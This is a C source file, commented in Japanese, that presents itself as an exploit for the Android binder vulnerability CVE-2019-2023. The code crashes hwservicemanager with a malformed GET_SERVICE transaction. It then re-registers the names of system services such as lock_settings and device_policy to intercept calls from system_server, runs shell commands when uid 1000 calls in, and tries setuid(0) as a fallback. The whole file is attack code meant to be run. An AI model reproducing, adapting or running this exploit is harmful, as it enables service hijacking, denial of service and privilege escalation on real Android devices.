#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <signal.h>
#include <stdint.h>
#include <sched.h>
#include <poll.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/syscall.h>
#include <dirent.h>
#include <arpa/inet.h>
#include <pthread.h>
#include "binder.h"

// ============================================================
// プロトタイプ宣言
// ============================================================
static void dump_hex(FILE *fp, const uint8_t *data, size_t len);
static void log_transaction(const char *msg, struct binder_transaction_data *t, const uint8_t *data);
static int write_file(const char *path, const char *data);
static pid_t get_hwservicemanager_pid(void);
static int exploit_cve_2019_2023(const char *service_name);
static int binder_server_loop(int binder_fd, int expected_handle);
static void register_and_serve(const char *service_name);
static int crash_hwservicemanager_with_bad_get_service(void);
static int call_own_service(const char *service_name, int handle);
static int fallback_setuid(void);

// ============================================================
// 設定
// ============================================================
#define OUTPUT_FILE    "/data/local/tmp/cve_2019_2023_result.txt"
#define LOG_FILE       "/data/local/tmp/binder_traffic.log"
#define SHELL_PATH     "/system/bin/sh"

// 乗っ取り対象サービスリスト（system_server が頻繁に要求するもの）
static const char *target_services[] = {
    "vendor.qti.hardware.servicetracker@1.0::IServicetracker/default",
    "android.hardware.power@1.0::IPower/default",
    "persistent_data_block",
    "device_policy",
    "lock_settings",
    "mount",
    NULL
};

static volatile int race_ready = 0;
static int g_exploit_success = 0;
static pid_t g_hwservicemanager_pid = 0;

// ============================================================
// ユーティリティ
// ============================================================
static void dump_hex(FILE *fp, const uint8_t *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        fprintf(fp, "%02x ", data[i]);
        if ((i+1) % 16 == 0) fprintf(fp, "\n");
    }
    fprintf(fp, "\n");
}

static void log_transaction(const char *msg, struct binder_transaction_data *t, const uint8_t *data) {
    FILE *fp = fopen(LOG_FILE, "a");
    if (!fp) fp = stderr;
    fprintf(fp, "[%ld] %s\n", time(NULL), msg);
    fprintf(fp, "  handle=%d code=0x%x flags=0x%x data_size=%zu offsets_size=%zu\n",
            t->target.handle, t->code, t->flags, (size_t)t->data_size, (size_t)t->offsets_size);
    if (data && t->data_size > 0) {
        fprintf(fp, "  data (%zu bytes):\n", (size_t)t->data_size);
        dump_hex(fp, data, t->data_size > 512 ? 512 : t->data_size);
    }
    if (fp != stderr) fclose(fp);
}

static int write_file(const char *path, const char *data) {
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return -1;
    ssize_t n = write(fd, data, strlen(data));
    close(fd);
    return (n == (ssize_t)strlen(data)) ? 0 : -1;
}

static pid_t get_hwservicemanager_pid(void) {
    FILE *fp = popen("pidof hwservicemanager", "r");
    if (!fp) return -1;
    char pid_str[16];
    if (!fgets(pid_str, sizeof(pid_str), fp)) {
        pclose(fp);
        return -1;
    }
    pclose(fp);
    pid_t pid = atoi(pid_str);
    if (pid <= 0) return -1;
    return pid;
}

// ============================================================
// CVE-2019-2023 基本登録（レース付き）
// ============================================================
static int exploit_cve_2019_2023(const char *service_name) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;
    int handle = -1;
    pid_t child;

    printf("[*] CVE-2019-2023: registering '%s'...\n", service_name);

    child = fork();
    if (child == 0) {
        while (!race_ready) usleep(100);
        exit(0);
    } else if (child < 0) {
        perror("  fork");
        return -1;
    }

    usleep(200000);

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        kill(child, SIGKILL);
        return -1;
    }

    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;                     // ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;                     // 読み取りなし（ブロック防止）
    bwr.read_buffer = 0;

    race_ready = 1;
    usleep(50000);

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl ADD_SERVICE");
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    printf("  [+] ADD_SERVICE succeeded!\n");

    kill(child, SIGKILL);
    waitpid(child, NULL, 0);

    // GET_SERVICE でハンドル取得
    data = malloc(total_len);
    if (!data) {
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    tx.tdata.code = 1;                     // GET_SERVICE
    tx.tdata.data_size = total_len;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl GET_SERVICE");
        close(hwbinder_fd);
        return -1;
    }
    if (bwr.read_consumed < 4) {
        printf("  [-] No handle returned\n");
        close(hwbinder_fd);
        return -1;
    }
    handle = *(int*)read_buf;
    printf("  [+] Service handle: %d\n", handle);
    close(hwbinder_fd);
    return handle;
}

// ============================================================
// hwservicemanager を確実にクラッシュさせる（不正な GET_SERVICE）
// ============================================================
static int crash_hwservicemanager_with_bad_get_service(void) {
    printf("[*] Crashing hwservicemanager with malformed GET_SERVICE (missing interface string)...\n");

    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        return -1;
    }

    // 不正なパーセル: インターフェース文字列を省略
    // 本来は、Parcel の先頭にインターフェース名（文字列）が入るが、それを省く。
    // サービス名は「dummy」など適当なものにする。
    const char *service_name = "dummy";
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len; // 4バイトの長さ + サービス名（文字列）
    uint8_t *data = malloc(total_len);
    if (!data) {
        close(hwbinder_fd);
        return -1;
    }
    // サービス名の長さを入れる
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    // トランザクションを送信（code=1 GET_SERVICE）
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 1;                     // GET_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0; // 読み取り不要（クラッシュさせるだけ）
    bwr.read_buffer = 0;

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    close(hwbinder_fd);

    if (ret < 0) {
        perror("  ioctl (malformed GET_SERVICE)");
        return -1;
    }

    printf("  [+] Malformed GET_SERVICE sent (hwservicemanager should crash).\n");
    // クラッシュしたか確認（少し待つ）
    sleep(1);
    pid_t new_pid = get_hwservicemanager_pid();
    if (new_pid != g_hwservicemanager_pid && new_pid > 0) {
        printf("[+] hwservicemanager crashed and restarted! New PID: %d\n", new_pid);
        g_hwservicemanager_pid = new_pid;
        return 0;
    } else {
        printf("[-] hwservicemanager did not crash (still PID %d)\n", g_hwservicemanager_pid);
        return -1;
    }
}

// ============================================================
// Binder サーバーループ
// ============================================================
static int binder_server_loop(int binder_fd, int expected_handle) {
    uint8_t read_buf[4096];
    struct binder_write_read bwr;
    int ret;
    int transaction_count = 0;

    printf("[*] Starting Binder server loop for handle %d...\n", expected_handle);
    printf("[*] Waiting for transactions...\n");

    while (1) {
        memset(&bwr, 0, sizeof(bwr));
        bwr.read_size = sizeof(read_buf);
        bwr.read_buffer = (binder_uintptr_t)read_buf;

        ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
        if (ret < 0) {
            perror("  ioctl read");
            break;
        }
        if (bwr.read_consumed == 0) {
            usleep(100000);
            continue;
        }

        uint32_t *cmd = (uint32_t*)read_buf;
        uint32_t cmd_code = *cmd;
        uint8_t *payload = read_buf + sizeof(uint32_t);
        size_t payload_size = bwr.read_consumed - sizeof(uint32_t);

        if (cmd_code == 0x720c) {
            fprintf(stderr, "[SERVER] BR_NOOP ignored.\n");
            continue;
        }

        fprintf(stderr, "[SERVER] Received cmd=0x%x (%d), size=%zu\n", cmd_code, cmd_code, payload_size);

        if (cmd_code == BR_TRANSACTION || cmd_code == BR_TRANSACTION_SEC_CTX) {
            struct binder_transaction_data *t = (struct binder_transaction_data*)payload;
            size_t data_size = t->data_size;
            uint8_t *data_ptr = NULL;
            if (data_size > 0 && data_size < 4096) {
                data_ptr = malloc(data_size);
                if (data_ptr) {
                    memcpy(data_ptr, (uint8_t*)(uintptr_t)t->data.ptr.buffer, data_size);
                }
            }
            log_transaction("Incoming transaction", t, data_ptr);
            if (data_ptr) free(data_ptr);

            if (t->sender_euid == 1000) {
                printf("[SERVER] ***** system_server CALLED OUR SERVICE! (uid=1000) *****\n");
                pid_t pid = fork();
                if (pid == 0) {
                    int fd = open(OUTPUT_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                    if (fd >= 0) {
                        dup2(fd, STDOUT_FILENO);
                        dup2(fd, STDERR_FILENO);
                        close(fd);
                    }
                    execl(SHELL_PATH, "sh", "-c", "id; getenforce; echo '=== CVE-2019-2023 EXPLOITED ==='", NULL);
                    exit(1);
                } else if (pid > 0) {
                    wait(NULL);
                    printf("[SERVER] id command executed. Check %s\n", OUTPUT_FILE);
                }
                g_exploit_success = 1;
            } else {
                printf("[SERVER] Sender uid=%d (ignoring)\n", t->sender_euid);
            }

            // 応答
            struct {
                uint32_t cmd;
                uint32_t status;
            } __attribute__((packed)) reply;
            reply.cmd = BR_OK;
            reply.status = 0;

            struct binder_write_read write_bwr;
            memset(&write_bwr, 0, sizeof(write_bwr));
            write_bwr.write_size = sizeof(reply);
            write_bwr.write_buffer = (binder_uintptr_t)&reply;

            ret = ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);
            if (ret < 0) perror("  ioctl write reply");

            uint32_t complete_cmd = BR_TRANSACTION_COMPLETE;
            write_bwr.write_size = sizeof(complete_cmd);
            write_bwr.write_buffer = (binder_uintptr_t)&complete_cmd;
            ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);

            transaction_count++;
            printf("[SERVER] Transaction #%d handled.\n", transaction_count);
        } else if (cmd_code == BR_DEAD_BINDER) {
            printf("[SERVER] Received DEAD_BINDER\n");
            break;
        } else {
            fprintf(stderr, "[SERVER] Unhandled cmd=0x%x\n", cmd_code);
        }
    }
    return transaction_count;
}

// ============================================================
// サービス登録 + サーバー起動
// ============================================================
static void register_and_serve(const char *service_name) {
    int handle = exploit_cve_2019_2023(service_name);
    if (handle < 0) {
        printf("[-] Failed to register '%s'\n", service_name);
        return;
    }
    printf("[+] Registered '%s' (handle %d)\n", service_name, handle);

    int binder_fd = open("/dev/hwbinder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open /dev/hwbinder for server");
        return;
    }

    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (binder_uintptr_t)&cmd;
    bwr.read_size = 0;
    if (ioctl(binder_fd, BINDER_WRITE_READ, &bwr) < 0) {
        perror("  BC_ENTER_LOOPER");
        close(binder_fd);
        return;
    }

    pid_t pid = fork();
    if (pid == 0) {
        binder_server_loop(binder_fd, handle);
        exit(0);
    } else if (pid > 0) {
        printf("[+] Binder server for '%s' running (PID %d)\n", service_name, pid);
        close(binder_fd);
    } else {
        perror("  fork server");
        close(binder_fd);
    }
}

// ============================================================
// 自分自身のサービスを呼び出してテスト
// ============================================================
static int call_own_service(const char *service_name, int handle) {
    printf("[*] Calling own service '%s' (handle %d) to trigger transaction...\n", service_name, handle);
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "service call %s 1 s16 'hello' 2>&1 | tee -a %s", service_name, LOG_FILE);
    int ret = system(cmd);
    if (ret == 0) {
        printf("[+] service call succeeded.\n");
    } else {
        printf("[-] service call failed (ret=%d).\n", ret);
    }
    return ret;
}

// ============================================================
// フォールバック
// ============================================================
static int fallback_setuid(void) {
    printf("[*] Fallback: trying setuid(0)...\n");
    if (setuid(0) == 0 || setresuid(0,0,0) == 0) {
        printf("[+] setuid(0) succeeded!\n");
        return 0;
    }
    return -1;
}

// ============================================================
// メイン
// ============================================================
int main(void) {
    printf("============================================================\n");
    printf("  CVE-2019-2023 Ultimate Exploit - Precise Crash & Hijack\n");
    printf("============================================================\n\n");

    // ログ初期化
    FILE *fp = fopen(LOG_FILE, "w");
    if (fp) {
        fprintf(fp, "=== Binder Traffic Log ===\n");
        fclose(fp);
        printf("[+] Log file created: %s\n", LOG_FILE);
    }

    g_hwservicemanager_pid = get_hwservicemanager_pid();
    if (g_hwservicemanager_pid <= 0) {
        printf("[-] Could not find hwservicemanager. Continuing anyway...\n");
    } else {
        printf("[+] Current hwservicemanager PID: %d\n", g_hwservicemanager_pid);
    }

    // フェーズ1: まず、乗っ取りたいサービスをあらかじめ登録しておく（system_server からの呼び出しに備える）
    printf("[*] Phase 1: Pre-register target services (backup) before crash\n");
    for (int i = 0; target_services[i] != NULL; i++) {
        register_and_serve(target_services[i]);
        usleep(300000);
    }

    // フェーズ2: hwservicemanager を不正な GET_SERVICE でクラッシュさせる（再起動を誘発）
    printf("[*] Phase 2: Crash hwservicemanager with malformed GET_SERVICE\n");
    int crash_ret = crash_hwservicemanager_with_bad_get_service();
    if (crash_ret != 0) {
        printf("[-] Crash failed, but continuing...\n");
    }

    // フェーズ3: 再起動を待つ
    printf("[*] Phase 3: Wait for hwservicemanager restart\n");
    int max_wait = 30;
    pid_t old_pid = g_hwservicemanager_pid;
    while (max_wait-- > 0) {
        pid_t new_pid = get_hwservicemanager_pid();
        if (new_pid > 0 && new_pid != old_pid) {
            printf("[+] hwservicemanager restarted with PID: %d\n", new_pid);
            g_hwservicemanager_pid = new_pid;
            break;
        }
        sleep(1);
    }

    // フェーズ4: 再起動直後に、乗っ取り対象のサービスを再登録（system_server が再接続する前に）
    printf("[*] Phase 4: Re-register services after restart (to hijack)\n");
    for (int i = 0; target_services[i] != NULL; i++) {
        register_and_serve(target_services[i]);
        usleep(200000);
    }

    // フェーズ5: 自分自身のサービスを呼び出してテスト（サーバーが動いているか確認）
    if (target_services[0] != NULL) {
        call_own_service(target_services[0], 29196);
    }

    // フェーズ6: system_server からの呼び出しを待つ
    printf("[*] Phase 6: Waiting for system_server to call...\n");
    printf("[*] Running for 180 seconds. Check %s for logs.\n", LOG_FILE);
    sleep(180);

    // 結果表示
    printf("\n[*] Log file content:\n");
    system("cat " LOG_FILE " 2>/dev/null || echo 'No log file found'");

    if (g_exploit_success) {
        printf("[+] Exploit succeeded! Check %s\n", OUTPUT_FILE);
    } else {
        printf("[-] No transaction from system_server received.\n");
        printf("[-] Try manually triggering system events (screen on/off, USB plug, etc.)\n");
        if (fallback_setuid() == 0) {
            system("id > " OUTPUT_FILE " 2>&1");
            system("cat " OUTPUT_FILE);
            g_exploit_success = 1;
        }
    }

    printf("\n============================================================\n");
    printf("  Exploit finished. Success: %s\n", g_exploit_success ? "YES" : "NO");
    return g_exploit_success ? 0 : 1;
}
